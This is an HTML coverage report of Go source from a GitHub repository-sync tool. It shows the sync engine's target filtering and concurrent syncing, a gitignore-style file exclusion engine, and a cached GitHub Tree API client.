        <span class="cov8" title="1">log.WithField("group_count", len(groups)).Info("Processing sync groups")

        // Check if we have multiple groups - use orchestrator if so
        if len(groups) &gt; 1 </span><span class="cov0" title="0">{
                // Use the orchestrator for multi-group execution
                orchestrator := NewGroupOrchestrator(e.config, e, e.logger)
                return orchestrator.ExecuteGroups(ctx, groups)
        }</span>

        // Single group - execute directly for backward compatibility
        <span class="cov8" title="1">group := groups[0]
        e.currentGroup = &amp;group // Set current group for RepositorySync to use
        log.WithField("group_name", group.Name).Info("Processing single group")

        // Execute the single group sync
        return e.executeSingleGroup(ctx, group, targetFilter)</span>
}

// executeSingleGroup handles synchronization for a single group
func (e *Engine) executeSingleGroup(ctx context.Context, group config.Group, targetFilter []string) error <span class="cov8" title="1">{
        log := e.logger.WithField("component", "sync_engine")

        // 1. Discover current state from GitHub
        log.Info("Discovering current state from GitHub")
        currentState, err := e.state.DiscoverState(ctx, e.config)
        if err != nil </span><span class="cov8" title="1">{
                return appErrors.WrapWithContext(err, "discover current state")
        }</span>

        <span class="cov8" title="1">log.WithFields(logrus.Fields{
                "source_repo":   currentState.Source.Repo,
                "source_commit": currentState.Source.LatestCommit,
                "target_count":  len(currentState.Targets),
        }).Info("State discovery completed")

        // 2. Determine which targets to sync using group's targets
        syncTargets, err := e.filterGroupTargets(targetFilter, group, currentState)
        if err != nil </span><span class="cov8" title="1">{
                return appErrors.WrapWithContext(err, "filter targets")
        }</span>

        <span class="cov8" title="1">if len(syncTargets) == 0 </span><span class="cov8" title="1">{
                log.Info("No targets require synchronization")
                return nil
        }</span>

        <span class="cov8" title="1">log.WithField("sync_targets", len(syncTargets)).Info("Targets selected for sync")

        // 3. Create progress tracker
        progress := NewProgressTrackerWithGroup(len(syncTargets), e.options.DryRun, group.Name, group.ID)

        // 4. Process repositories concurrently
        g, ctx := errgroup.WithContext(ctx)
        g.SetLimit(e.options.MaxConcurrency)

        for _, target := range syncTargets </span><span class="cov8" title="1">{
                g.Go(func() error </span><span class="cov8" title="1">{
                        return e.syncRepository(ctx, target, currentState, progress)
                }</span>)
        }

        // 5. Wait for all syncs to complete
        <span class="cov8" title="1">if err := g.Wait(); err != nil </span><span class="cov8" title="1">{
                progress.SetError(err)
                return appErrors.WrapWithContext(err, "complete sync operation")
        }</span>

        // 6. Report final results
        <span class="cov0" title="0">results := progress.GetResults()
        log.WithFields(logrus.Fields{
                "successful": results.Successful,
                "failed":     results.Failed,
                "skipped":    results.Skipped,
                "duration":   results.Duration,
        }).Info("Sync operation completed")

        if results.Failed &gt; 0 </span><span class="cov0" title="0">{
                return fmt.Errorf("%w: completed with %d failures", appErrors.ErrSyncFailed, results.Failed)
        }</span>

        <span class="cov0" title="0">return nil</span>
}

// filterGroupTargets determines which targets need to be synced based on filters, group, and current state
func (e *Engine) filterGroupTargets(targetFilter []string, group config.Group, currentState *state.State) ([]config.TargetConfig, error) <span class="cov8" title="1">{
        var targets []config.TargetConfig

        // If no filter specified, use all targets from the group
        if len(targetFilter) == 0 </span><span class="cov8" title="1">{
                targets = group.Targets
        }</span> else<span class="cov8" title="1"> {
                // Filter targets based on command line arguments
                for _, target := range group.Targets </span><span class="cov8" title="1">{
                        for _, filter := range targetFilter </span><span class="cov8" title="1">{
                                if target.Repo == filter </span><span class="cov8" title="1">{
                                        targets = append(targets, target)
                                        break</span>
                                }
                        }
                }

                <span class="cov8" title="1">if len(targets) == 0 </span><span class="cov8" title="1">{
                        return nil, fmt.Errorf("%w: %v", appErrors.ErrNoMatchingTargets, targetFilter)
                }</span>
        }

        // Use common filtering logic
        <span class="cov8" title="1">return e.filterTargetsFromList(targets, currentState)</span>
}

// filterTargets determines which targets need to be synced based on filters and current state (legacy method)
func (e *Engine) filterTargets(targetFilter []string, currentState *state.State) ([]config.TargetConfig, error) <span class="cov8" title="1">{
        // Try to use compatibility layer first
        groups := e.config.Groups
        if len(groups) &gt; 0 </span><span class="cov8" title="1">{
                return e.filterGroupTargets(targetFilter, groups[0], currentState)
        }</span>

        // Fallback to direct field access for incomplete configs (like in tests)
        <span class="cov0" title="0">var targets []config.TargetConfig

        // Get all targets from all groups
        allTargets := []config.TargetConfig{}
        for _, group := range e.config.Groups </span><span class="cov0" title="0">{
                allTargets = append(allTargets, group.Targets...)
        }</span>

        // If no filter specified, use all configured targets
        <span class="cov0" title="0">if len(targetFilter) == 0 </span><span class="cov0" title="0">{
                targets = allTargets
        }</span> else<span class="cov0" title="0"> {
                // Filter targets based on command line arguments
                for _, target := range allTargets </span><span class="cov0" title="0">{
                        for _, filter := range targetFilter </span><span class="cov0" title="0">{
                                if target.Repo == filter </span><span class="cov0" title="0">{
                                        targets = append(targets, target)
                                        break</span>
                                }
                        }
                }

                <span class="cov0" title="0">if len(targets) == 0 </span><span class="cov0" title="0">{
                        return nil, fmt.Errorf("%w: %v", appErrors.ErrNoMatchingTargets, targetFilter)
                }</span>
        }

        <span class="cov0" title="0">return e.filterTargetsFromList(targets, currentState)</span>
}

// filterTargetsFromList filters targets from a provided list based on sync necessity
func (e *Engine) filterTargetsFromList(targets []config.TargetConfig, currentState *state.State) ([]config.TargetConfig, error) <span class="cov8" title="1">{
        // Further filter based on sync necessity (unless forced)
        if !e.options.Force </span><span class="cov8" title="1">{
                var syncNeeded []config.TargetConfig

                for _, target := range targets </span><span class="cov8" title="1">{
                        if e.needsSync(target, currentState) </span><span class="cov8" title="1">{
                                syncNeeded = append(syncNeeded, target)
                        }</span> else<span class="cov8" title="1"> {
                                e.logger.WithField("repo", target.Repo).Info("Target is up-to-date, skipping")
                        }</span>
                }

                <span class="cov8" title="1">targets = syncNeeded</span>
        }

        <span class="cov8" title="1">return targets, nil</span>
}

// needsSync determines if a target repository needs synchronization
func (e *Engine) needsSync(target config.TargetConfig, currentState *state.State) bool <span class="cov8" title="1">{
        targetState, exists := currentState.Targets[target.Repo]
        if !exists </span><span class="cov8" title="1">{
                // No state found, sync needed
                return true
        }</span>

        <span class="cov8" title="1">switch targetState.Status </span>{
        case state.StatusUpToDate:<span class="cov8" title="1">
                return false</span>
        case state.StatusBehind:<span class="cov8" title="1">
                return true</span>
        case state.StatusPending:<span class="cov8" title="1">
                // PR is open, check if we should update it
                return e.options.UpdateExistingPRs</span>
        case state.StatusConflict:<span class="cov8" title="1">
                // Conflicts require manual intervention
                e.logger.WithField("repo", target.Repo).Warn("Repository has conflicts, skipping automatic sync")
                return false</span>
        default:<span class="cov8" title="1">
                // Unknown status, err on the side of caution and sync
                return true</span>
        }
}

// syncRepository handles synchronization for a single repository
func (e *Engine) syncRepository(ctx context.Context, target config.TargetConfig, currentState *state.State, progress *ProgressTracker) error <span class="cov8" title="1">{
        fields := logrus.Fields{
                "target_repo": target.Repo,
                "component":   "repository_sync",
        }
        // Add group context if available
        if e.currentGroup != nil </span><span class="cov8" title="1">{
                fields["group_name"] = e.currentGroup.Name
                fields["group_id"] = e.currentGroup.ID
        }</span>
        <span class="cov8" title="1">log := e.logger.WithFields(fields)

        progress.StartRepository(target.Repo)
        defer progress.FinishRepository(target.Repo)

        log.Info("Starting repository sync")

        // Get target state
        targetState := currentState.Targets[target.Repo]

        // Create repository syncer
        repoSync := &amp;RepositorySync{
                engine:      e,
                target:      target,
                sourceState: &amp;currentState.Source,
                targetState: targetState,
                logger:      log,
        }

        // Execute sync
        err := repoSync.Execute(ctx)
        if err != nil </span><span class="cov8" title="1">{
                log.WithError(err).Error("Repository sync failed")
                progress.RecordError(target.Repo, err)
                return appErrors.WrapWithContext(err, fmt.Sprintf("sync %s", target.Repo))
        }</span>

        <span class="cov0" title="0">log.Info("Repository sync completed successfully")
        progress.RecordSuccess(target.Repo)
        return nil</span>
}
</pre>

		<pre class="file" id="file62" style="display: none">package sync

import (
        "path/filepath"
        "regexp"
        "strings"
        "sync"
)

// ExclusionEngine handles gitignore-style pattern matching with caching
type ExclusionEngine struct {
        patterns        []exclusionPattern
        includePatterns []exclusionPattern
        cache           sync.Map // map[string]bool for path -&gt; excluded mapping
        mu              sync.RWMutex
}

// exclusionPattern represents a compiled exclusion pattern
type exclusionPattern struct {
        original string
        regex    *regexp.Regexp
        negate   bool
        isDir    bool
}

// NewExclusionEngine creates a new exclusion engine with default patterns
func NewExclusionEngine(excludePatterns []string) *ExclusionEngine <span class="cov8" title="1">{
        return NewExclusionEngineWithIncludes(excludePatterns, nil)
}</span>

// NewExclusionEngineWithIncludes creates a new exclusion engine with both exclude and include patterns
func NewExclusionEngineWithIncludes(excludePatterns, includePatterns []string) *ExclusionEngine <span class="cov8" title="1">{
        // defaultExclusions contains common patterns that should typically be excluded
        defaultExclusions := []string{
                ".git/",
                ".git/**",
                "**/.git/",
                "**/.git/**",
                "node_modules/",
                "node_modules/**",
                "**/node_modules/",
                "**/node_modules/**",
                ".DS_Store",
                "**/.DS_Store",
                "Thumbs.db",
                "**/Thumbs.db",
                "*.tmp",
                "*.temp",
                "**/*.tmp",
                "**/*.temp",
                ".env",
                ".env.*",
                "**/.env",
                "**/.env.*",
        }

        engine := &amp;ExclusionEngine{
                patterns:        make([]exclusionPattern, 0, len(excludePatterns)+len(defaultExclusions)),
                includePatterns: make([]exclusionPattern, 0, len(includePatterns)),
        }

        // Add default exclusions first
        for _, pattern := range defaultExclusions </span><span class="cov8" title="1">{
                engine.addExcludePattern(pattern)
        }</span>

        // Add user-specified exclude patterns
        <span class="cov8" title="1">for _, pattern := range excludePatterns </span><span class="cov8" title="1">{
                engine.addExcludePattern(pattern)
        }</span>

        // Add user-specified include patterns
        <span class="cov8" title="1">for _, pattern := range includePatterns </span><span class="cov0" title="0">{
                engine.addIncludePattern(pattern)
        }</span>

        <span class="cov8" title="1">return engine</span>
}

// IsExcluded checks if a file path should be excluded based on the configured patterns
func (e *ExclusionEngine) IsExcluded(filePath string) bool <span class="cov8" title="1">{
        // Normalize path separators
        normalizedPath := filepath.ToSlash(filePath)

        // Check cache first
        if cached, found := e.cache.Load(normalizedPath); found </span><span class="cov8" title="1">{
                return cached.(bool)
        }</span>

        // Evaluate patterns
        <span class="cov8" title="1">excluded := e.evaluatePatterns(normalizedPath)

        // Cache the result
        e.cache.Store(normalizedPath, excluded)

        return excluded</span>
}

// IsDirectoryExcluded checks if a directory should be excluded
// This is optimized for directory traversal to avoid walking excluded directories
func (e *ExclusionEngine) IsDirectoryExcluded(dirPath string) bool <span class="cov8" title="1">{
        // Normalize and ensure trailing slash for directory matching
        normalizedPath := filepath.ToSlash(dirPath)
        if !strings.HasSuffix(normalizedPath, "/") </span><span class="cov8" title="1">{
                normalizedPath += "/"
        }</span>

        // Check cache first
        <span class="cov8" title="1">cacheKey := normalizedPath + "__DIR__"
        if cached, found := e.cache.Load(cacheKey); found </span><span class="cov8" title="1">{
                return cached.(bool)
        }</span>

        // Evaluate patterns specifically for directories
        <span class="cov8" title="1">excluded := e.evaluateDirectoryPatterns(normalizedPath)

        // Cache the result
        e.cache.Store(cacheKey, excluded)

        return excluded</span>
}

// ClearCache clears the pattern matching cache
func (e *ExclusionEngine) ClearCache() <span class="cov8" title="1">{
        e.cache.Range(func(key, _ interface{}) bool </span><span class="cov8" title="1">{
                e.cache.Delete(key)
                return true
        }</span>)
}

// GetPatterns returns the original patterns for debugging
func (e *ExclusionEngine) GetPatterns() []string <span class="cov8" title="1">{
        e.mu.RLock()
        defer e.mu.RUnlock()

        patterns := make([]string, len(e.patterns))
        for i, pattern := range e.patterns </span><span class="cov8" title="1">{
                patterns[i] = pattern.original
        }</span>
        <span class="cov8" title="1">return patterns</span>
}

// addExcludePattern compiles and adds an exclusion pattern to the engine
func (e *ExclusionEngine) addExcludePattern(pattern string) <span class="cov8" title="1">{
        if pattern == "" </span><span class="cov0" title="0">{
                return
        }</span>

        <span class="cov8" title="1">e.mu.Lock()
        defer e.mu.Unlock()

        compiled := e.compilePattern(pattern)
        if compiled.regex != nil </span><span class="cov8" title="1">{
                e.patterns = append(e.patterns, compiled)
        }</span>
}

// addIncludePattern compiles and adds an inclusion pattern to the engine
func (e *ExclusionEngine) addIncludePattern(pattern string) <span class="cov0" title="0">{
        if pattern == "" </span><span class="cov0" title="0">{
                return
        }</span>

        <span class="cov0" title="0">e.mu.Lock()
        defer e.mu.Unlock()

        compiled := e.compilePattern(pattern)
        if compiled.regex != nil </span><span class="cov0" title="0">{
                e.includePatterns = append(e.includePatterns, compiled)
        }</span>
}

// addPattern compiles and adds a pattern to the engine (for backward compatibility)
func (e *ExclusionEngine) addPattern(pattern string) <span class="cov8" title="1">{
        e.addExcludePattern(pattern)
}</span>

// compilePattern converts a gitignore-style pattern into a compiled regex pattern
func (e *ExclusionEngine) compilePattern(pattern string) exclusionPattern <span class="cov8" title="1">{
        original := pattern
        negate := false
        isDir := false

        // Handle negation
        if strings.HasPrefix(pattern, "!") </span><span class="cov8" title="1">{
                negate = true
                pattern = pattern[1:]
        }</span>

        // Handle directory-only patterns
        <span class="cov8" title="1">if strings.HasSuffix(pattern, "/") </span><span class="cov8" title="1">{
                isDir = true
                pattern = strings.TrimSuffix(pattern, "/")
        }</span>

        // Escape regex special characters except * and ?
        <span class="cov8" title="1">pattern = regexp.QuoteMeta(pattern)

        // Convert gitignore wildcards to regex
        pattern = strings.ReplaceAll(pattern, `\*\*`, `.*`)  // ** matches any number of directories
        pattern = strings.ReplaceAll(pattern, `\*`, `[^/]*`) // * matches any character except /
        pattern = strings.ReplaceAll(pattern, `\?`, `.`)     // ? matches any single character

        // Handle different pattern types
        var regexPattern string
        if strings.HasPrefix(original, "/") </span><span class="cov0" title="0">{
                // Absolute pattern from root
                regexPattern = "^" + strings.TrimPrefix(pattern, `/`) + "$"
        }</span> else<span class="cov8" title="1"> if strings.Contains(original, "/") </span><span class="cov8" title="1">{
                // Pattern contains slash - match from any directory level
                regexPattern = "(^|.*/)(" + pattern + ")($|/.*)"
        }</span> else<span class="cov8" title="1"> {
                // Simple filename pattern - match basename
                regexPattern = "(^|.*/)(" + pattern + ")($|/.*)"
        }</span>

        // Compile regex
        <span class="cov8" title="1">regex, err := regexp.Compile(regexPattern)
        if err != nil </span><span class="cov0" title="0">{
                // If compilation fails, create a simple literal match
                literalPattern := "(^|.*/)(" + regexp.QuoteMeta(original) + ")($|/.*)"
                regex, _ = regexp.Compile(literalPattern)
        }</span>

        <span class="cov8" title="1">return exclusionPattern{
                original: original,
                regex:    regex,
                negate:   negate,
                isDir:    isDir,
        }</span>
}

// evaluatePatterns evaluates all patterns against a file path
func (e *ExclusionEngine) evaluatePatterns(path string) bool <span class="cov8" title="1">{
        e.mu.RLock()
        defer e.mu.RUnlock()

        // If we have include patterns, use allowlist logic
        if len(e.includePatterns) &gt; 0 </span><span class="cov0" title="0">{
                return e.evaluateIncludePatterns(path)
        }</span>

        // Otherwise, use exclusion logic
        <span class="cov8" title="1">excluded := false

        // Process patterns in order
        for _, pattern := range e.patterns </span><span class="cov8" title="1">{
                if pattern.regex == nil </span><span class="cov0" title="0">{
                        continue</span>
                }

                // For directory-only patterns, skip if this is not a directory path
                <span class="cov8" title="1">if pattern.isDir &amp;&amp; !strings.HasSuffix(path, "/") </span><span class="cov8" title="1">{
                        continue</span>
                }

                <span class="cov8" title="1">if pattern.regex.MatchString(path) </span><span class="cov8" title="1">{
                        if pattern.negate </span><span class="cov8" title="1">{
                                excluded = false // Negation overrides previous exclusions
                        }</span> else<span class="cov8" title="1"> {
                                excluded = true
                        }</span>
                }
        }

        <span class="cov8" title="1">return excluded</span>
}

// evaluateIncludePatterns evaluates include patterns (allowlist logic)
func (e *ExclusionEngine) evaluateIncludePatterns(path string) bool <span class="cov0" title="0">{
        // First check if it matches any include pattern
        included := false
        for _, pattern := range e.includePatterns </span><span class="cov0" title="0">{
                if pattern.regex == nil </span><span class="cov0" title="0">{
                        continue</span>
                }

                // For directory-only patterns, skip if this is not a directory path
                <span class="cov0" title="0">if pattern.isDir &amp;&amp; !strings.HasSuffix(path, "/") </span><span class="cov0" title="0">{
                        continue</span>
                }

                <span class="cov0" title="0">if pattern.regex.MatchString(path) </span><span class="cov0" title="0">{
                        included = true
                        break</span>
                }
        }

        // If not included by include patterns, it's excluded
        <span class="cov0" title="0">if !included </span><span class="cov0" title="0">{
                return true
        }</span>

        // Even if included, check if it's explicitly excluded by exclude patterns
        <span class="cov0" title="0">for _, pattern := range e.patterns </span><span class="cov0" title="0">{
                if pattern.regex == nil </span><span class="cov0" title="0">{
                        continue</span>
                }

                // For directory-only patterns, skip if this is not a directory path
                <span class="cov0" title="0">if pattern.isDir &amp;&amp; !strings.HasSuffix(path, "/") </span><span class="cov0" title="0">{
                        continue</span>
                }

                <span class="cov0" title="0">if pattern.regex.MatchString(path) </span><span class="cov0" title="0">{
                        if !pattern.negate </span><span class="cov0" title="0">{
                                return true // Excluded by explicit exclude pattern
                        }</span>
                }
        }

        <span class="cov0" title="0">return false</span> // Included and not explicitly excluded
}

// evaluateDirectoryPatterns evaluates patterns specifically for directories
func (e *ExclusionEngine) evaluateDirectoryPatterns(dirPath string) bool <span class="cov8" title="1">{
        e.mu.RLock()
        defer e.mu.RUnlock()

        // If we have include patterns, use allowlist logic
        if len(e.includePatterns) &gt; 0 </span><span class="cov0" title="0">{
                return e.evaluateDirectoryIncludePatterns(dirPath)
        }</span>

        // Otherwise, use exclusion logic
        <span class="cov8" title="1">excluded := false

        // Process patterns in order
        for _, pattern := range e.patterns </span><span class="cov8" title="1">{
                if pattern.regex == nil </span><span class="cov0" title="0">{
                        continue</span>
                }

                // Check both with and without trailing slash
                <span class="cov8" title="1">pathToCheck := strings.TrimSuffix(dirPath, "/")
                matches := pattern.regex.MatchString(pathToCheck) || pattern.regex.MatchString(dirPath)

                if matches </span><span class="cov8" title="1">{
                        if pattern.negate </span><span class="cov0" title="0">{
                                excluded = false // Negation overrides previous exclusions
                        }</span> else<span class="cov8" title="1"> {
                                excluded = true
                        }</span>
                }
        }

        <span class="cov8" title="1">return excluded</span>
}

// evaluateDirectoryIncludePatterns evaluates include patterns for directories
func (e *ExclusionEngine) evaluateDirectoryIncludePatterns(dirPath string) bool <span class="cov0" title="0">{
        // First check if it matches any include pattern
        included := false
        for _, pattern := range e.includePatterns </span><span class="cov0" title="0">{
                if pattern.regex == nil </span><span class="cov0" title="0">{
                        continue</span>
                }

                // Check both with and without trailing slash
                <span class="cov0" title="0">pathToCheck := strings.TrimSuffix(dirPath, "/")
                matches := pattern.regex.MatchString(pathToCheck) || pattern.regex.MatchString(dirPath)

                if matches </span><span class="cov0" title="0">{
                        included = true
                        break</span>
                }
        }

        // If not included by include patterns, it's excluded
        <span class="cov0" title="0">if !included </span><span class="cov0" title="0">{
                return true
        }</span>

        // Even if included, check if it's explicitly excluded by exclude patterns
        <span class="cov0" title="0">for _, pattern := range e.patterns </span><span class="cov0" title="0">{
                if pattern.regex == nil </span><span class="cov0" title="0">{
                        continue</span>
                }

                // Check both with and without trailing slash
                <span class="cov0" title="0">pathToCheck := strings.TrimSuffix(dirPath, "/")
                matches := pattern.regex.MatchString(pathToCheck) || pattern.regex.MatchString(dirPath)

                if matches </span><span class="cov0" title="0">{
                        if !pattern.negate </span><span class="cov0" title="0">{
                                return true // Excluded by explicit exclude pattern
                        }</span>
                }
        }

        <span class="cov0" title="0">return false</span> // Included and not explicitly excluded
}

// AddPatterns adds additional exclusion patterns at runtime
func (e *ExclusionEngine) AddPatterns(patterns []string) <span class="cov8" title="1">{
        for _, pattern := range patterns </span><span class="cov8" title="1">{
                e.addPattern(pattern)
        }</span>
        // Clear cache since patterns have changed
        <span class="cov8" title="1">e.ClearCache()</span>
}

// RemovePatterns removes patterns by their original string (useful for dynamic management)
func (e *ExclusionEngine) RemovePatterns(patternsToRemove []string) <span class="cov8" title="1">{
        e.mu.Lock()
        defer e.mu.Unlock()

        removeSet := make(map[string]bool)
        for _, pattern := range patternsToRemove </span><span class="cov8" title="1">{
                removeSet[pattern] = true
        }</span>

        <span class="cov8" title="1">filtered := make([]exclusionPattern, 0, len(e.patterns))
        for _, pattern := range e.patterns </span><span class="cov8" title="1">{
                if !removeSet[pattern.original] </span><span class="cov8" title="1">{
                        filtered = append(filtered, pattern)
                }</span>
        }

        <span class="cov8" title="1">e.patterns = filtered
        e.ClearCache()</span>
}
</pre>

		<pre class="file" id="file63" style="display: none">// Package sync provides GitHub Tree API integration for bulk file operations
package sync

import (
        "context"
        "crypto/rand"
        "fmt"
        "math"
        "math/big"
        "path/filepath"
        "strings"
        "sync/atomic"
        "time"

        "github.com/sirupsen/logrus"

        "github.com/mrz1836/go-broadcast/internal/cache"
        appErrors "github.com/mrz1836/go-broadcast/internal/errors"
        "github.com/mrz1836/go-broadcast/internal/gh"
)

// GitTreeNode represents a single node in a Git tree
type GitTreeNode = gh.GitTreeNode

// GitTree represents a Git tree structure
type GitTree = gh.GitTree

// TreeMap provides O(1) file existence checks
type TreeMap struct {
        files       map[string]*GitTreeNode // Full file paths
        directories map[string]bool         // Directory paths
        sha         string                  // Tree SHA for cache key
        fetchedAt   time.Time               // When the tree was fetched
}

// HasFile checks if a file exists in the tree
func (tm *TreeMap) HasFile(filePath string) bool <span class="cov8" title="1">{
        _, exists := tm.files[strings.TrimPrefix(filePath, "/")]
        return exists
}</span>

// HasDirectory checks if a directory exists in the tree
func (tm *TreeMap) HasDirectory(dirPath string) bool <span class="cov8" title="1">{
        cleanPath := strings.TrimPrefix(strings.TrimSuffix(dirPath, "/"), "/")
        if cleanPath == "" </span><span class="cov8" title="1">{
                return true // Root directory always exists
        }</span>
        <span class="cov8" title="1">return tm.directories[cleanPath]</span>
}

// GetFile returns the tree node for a specific file
func (tm *TreeMap) GetFile(filePath string) (*GitTreeNode, bool) <span class="cov8" title="1">{
        node, exists := tm.files[strings.TrimPrefix(filePath, "/")]
        return node, exists
}</span>

// GetFilesInDirectory returns all files in a specific directory
func (tm *TreeMap) GetFilesInDirectory(dirPath string) []*GitTreeNode <span class="cov8" title="1">{
        cleanDir := strings.TrimPrefix(strings.TrimSuffix(dirPath, "/"), "/")
        if cleanDir != "" </span><span class="cov8" title="1">{
                cleanDir += "/"
        }</span>

        <span class="cov8" title="1">var files []*GitTreeNode
        for filePath, node := range tm.files </span><span class="cov8" title="1">{
                if strings.HasPrefix(filePath, cleanDir) </span><span class="cov8" title="1">{
                        // Only include direct children, not nested files
                        relativePath := strings.TrimPrefix(filePath, cleanDir)
                        if !strings.Contains(relativePath, "/") </span><span class="cov8" title="1">{
                                files = append(files, node)
                        }</span>
                }
        }
        <span class="cov8" title="1">return files</span>
}

// TreeStats provides statistics about the tree
type TreeStats struct {
        TotalFiles       int
        TotalDirectories int
        MaxDepth         int
        TreeSHA          string
        FetchedAt        time.Time
}

// GetStats returns statistics about the tree
func (tm *TreeMap) GetStats() TreeStats <span class="cov8" title="1">{
        maxDepth := 0
        for filePath := range tm.files </span><span class="cov8" title="1">{
                depth := strings.Count(filePath, "/")
                if depth &gt; maxDepth </span><span class="cov8" title="1">{
                        maxDepth = depth
                }</span>
        }

        <span class="cov8" title="1">return TreeStats{
                TotalFiles:       len(tm.files),
                TotalDirectories: len(tm.directories),
                MaxDepth:         maxDepth,
                TreeSHA:          tm.sha,
                FetchedAt:        tm.fetchedAt,
        }</span>
}

// APIStats tracks GitHub API call statistics
type APIStats struct {
        TreeFetches     atomic.Int64
        CacheHits       atomic.Int64
        CacheMisses     atomic.Int64
        TotalRetries    atomic.Int64
        TotalRateLimit  atomic.Int64
        AverageTreeSize atomic.Int64
}

// GetStats returns current API statistics
func (stats *APIStats) GetStats() (treeFetches, cacheHits, cacheMisses, retries, rateLimits, avgTreeSize int64) <span class="cov8" title="1">{
        return stats.TreeFetches.Load(),
                stats.CacheHits.Load(),
                stats.CacheMisses.Load(),
                stats.TotalRetries.Load(),
                stats.TotalRateLimit.Load(),
                stats.AverageTreeSize.Load()
}</span>

// GitHubAPI provides GitHub Tree API integration with caching and bulk operations
type GitHubAPI struct {
        client     gh.Client
        cache      *cache.TTLCache
        cacheTTL   time.Duration
        maxRetries int
        baseDelay  time.Duration
        logger     *logrus.Logger
        stats      *APIStats
}

// NewGitHubAPI creates a new GitHub API client with tree caching support
func NewGitHubAPI(client gh.Client, logger *logrus.Logger) *GitHubAPI <span class="cov8" title="1">{
        return NewGitHubAPIWithOptions(client, logger, GitHubAPIOptions{})
}</span>

// GitHubAPIOptions configures the GitHub API client
type GitHubAPIOptions struct {
        CacheTTL       time.Duration // Default: 5 minutes
        MaxCacheSize   int           // Default: 1000 repositories
        MaxRetries     int           // Default: 3
        BaseRetryDelay time.Duration // Default: 1 second
}

// NewGitHubAPIWithOptions creates a new GitHub API client with custom options
func NewGitHubAPIWithOptions(client gh.Client, logger *logrus.Logger, opts GitHubAPIOptions) *GitHubAPI <span class="cov8" title="1">{
        // Set defaults
        if opts.CacheTTL == 0 </span><span class="cov8" title="1">{
                opts.CacheTTL = 5 * time.Minute
        }</span>
        <span class="cov8" title="1">if opts.MaxCacheSize == 0 </span><span class="cov8" title="1">{
                opts.MaxCacheSize = 1000
        }</span>
        <span class="cov8" title="1">if opts.MaxRetries == 0 </span><span class="cov8" title="1">{
                opts.MaxRetries = 3
        }</span>
        <span class="cov8" title="1">if opts.BaseRetryDelay == 0 </span><span class="cov8" title="1">{
                opts.BaseRetryDelay = time.Second
        }</span>

        <span class="cov8" title="1">return &amp;GitHubAPI{
                client:     client,
                cache:      cache.NewTTLCache(opts.CacheTTL, opts.MaxCacheSize),
                cacheTTL:   opts.CacheTTL,
                maxRetries: opts.MaxRetries,
                baseDelay:  opts.BaseRetryDelay,
                logger:     logger,
                stats:      &amp;APIStats{},
        }</span>
}

// GetTree fetches the Git tree for a repository using GitHub's tree API
func (api *GitHubAPI) GetTree(ctx context.Context, repo, ref string) (*TreeMap, error) <span class="cov8" title="1">{
        log := api.logger.WithFields(logrus.Fields{
                "component": "github_tree_api",
                "repo":      repo,
                "ref":       ref,
        })

        // Try cache first
        cacheKey := fmt.Sprintf("%s:%s", repo, ref)
        if cached, ok := api.cache.Get(cacheKey); ok </span><span class="cov8" title="1">{
                log.Debug("Tree found in cache")
                api.stats.CacheHits.Add(1)
                return cached.(*TreeMap), nil
        }</span>

        <span class="cov8" title="1">api.stats.CacheMisses.Add(1)
        log.Debug("Tree not in cache, fetching from GitHub")

        // Fetch tree with retries
        treeMap, err := api.fetchTreeWithRetry(ctx, repo, ref)
        if err != nil </span><span class="cov8" title="1">{
                return nil, appErrors.WrapWithContext(err, fmt.Sprintf("fetch tree for %s@%s", repo, ref))
        }</span>

        // Cache the result
        <span class="cov8" title="1">api.cache.Set(cacheKey, treeMap)
        api.stats.TreeFetches.Add(1)

        log.WithFields(logrus.Fields{
                "files":       len(treeMap.files),
                "directories": len(treeMap.directories),
                "tree_sha":    treeMap.sha,
        }).Info("Successfully fetched and cached Git tree")

        return treeMap, nil</span>
}

// BatchCheckFiles checks existence of multiple files in O(1) time using the tree
func (api *GitHubAPI) BatchCheckFiles(ctx context.Context, repo, ref string, filePaths []string) (map[string]bool, error) <span class="cov8" title="1">{
        if len(filePaths) == 0 </span><span class="cov8" title="1">{
                return make(map[string]bool), nil
        }</span>

        <span class="cov8" title="1">log := api.logger.WithFields(logrus.Fields{
                "component":  "github_batch_check",
                "repo":       repo,
                "ref":        ref,
                "file_count": len(filePaths),
        })

        // Get tree map
        treeMap, err := api.GetTree(ctx, repo, ref)
        if err != nil </span><span class="cov0" title="0">{
                return nil, appErrors.WrapWithContext(err, "get tree for batch file check")
        }</span>

        // Check all files in O(1) per file
        <span class="cov8" title="1">results := make(map[string]bool, len(filePaths))
        for _, filePath := range filePaths </span><span class="cov8" title="1">{
                results[filePath] = treeMap.HasFile(filePath)
        }</span>

        <span class="cov8" title="1">log.WithField("found_files", countTrue(results)).Debug("Batch file check completed")
        return results, nil</span>
}

// BatchCheckDirectories checks existence of multiple directories
func (api *GitHubAPI) BatchCheckDirectories(ctx context.Context, repo, ref string, dirPaths []string) (map[string]bool, error) <span class="cov8" title="1">{
        if len(dirPaths) == 0 </span><span class="cov8" title="1">{
                return make(map[string]bool), nil
        }</span>

        <span class="cov8" title="1">log := api.logger.WithFields(logrus.Fields{
                "component": "github_batch_dir_check",
                "repo":      repo,
                "ref":       ref,
                "dir_count": len(dirPaths),
        })

        // Get tree map
        treeMap, err := api.GetTree(ctx, repo, ref)
        if err != nil </span><span class="cov0" title="0">{
                return nil, appErrors.WrapWithContext(err, "get tree for batch directory check")
        }</span>

        // Check all directories
        <span class="cov8" title="1">results := make(map[string]bool, len(dirPaths))
        for _, dirPath := range dirPaths </span><span class="cov8" title="1">{
                results[dirPath] = treeMap.HasDirectory(dirPath)
        }</span>

        <span class="cov8" title="1">log.WithField("found_dirs", countTrue(results)).Debug("Batch directory check completed")
        return results, nil</span>
}

// GetFilesInDirectory returns all files in a specific directory
func (api *GitHubAPI) GetFilesInDirectory(ctx context.Context, repo, ref, dirPath string) ([]*GitTreeNode, error) <span class="cov8" title="1">{
        treeMap, err := api.GetTree(ctx, repo, ref)
        if err != nil </span><span class="cov0" title="0">{
                return nil, appErrors.WrapWithContext(err, "get tree for directory listing")
        }</span>

        <span class="cov8" title="1">return treeMap.GetFilesInDirectory(dirPath), nil</span>
}

// InvalidateCache removes a repository's tree from cache
func (api *GitHubAPI) InvalidateCache(repo, ref string) <span class="cov8" title="1">{
        cacheKey := fmt.Sprintf("%s:%s", repo, ref)
        api.cache.Delete(cacheKey)
        api.logger.WithFields(logrus.Fields{
                "repo": repo,
                "ref":  ref,
        }).Debug("Invalidated tree cache")
}</span>

// GetCacheStats returns cache statistics
func (api *GitHubAPI) GetCacheStats() (hits, misses int64, size int, hitRate float64) <span class="cov8" title="1">{
        return api.cache.Stats()
}</span>

// GetAPIStats returns API call statistics
